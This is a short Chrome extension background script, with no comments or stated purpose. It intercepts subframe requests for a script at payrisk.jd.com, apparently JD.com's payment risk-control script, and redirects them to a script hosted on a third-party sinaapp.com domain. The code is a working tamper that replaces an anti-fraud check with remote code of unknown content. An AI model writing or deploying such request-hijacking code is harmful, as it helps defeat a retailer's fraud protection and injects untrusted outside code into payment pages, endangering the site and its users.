chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {

})
chrome.webRequest.onBeforeRequest.addListener(
	function(details) {
		if (details.frameId != 0 && details.type == "script") {
			if (details.url.indexOf("payrisk.jd.com/js/td.js") >= 0) {
				console.log(details);
				return {
					redirectUrl: "https://1.nageren.sinaapp.com/js/temp1.js"
				};
			}
		}
	}, {
		urls: [
			"<all_urls>"
		]
	}, ["blocking"]);
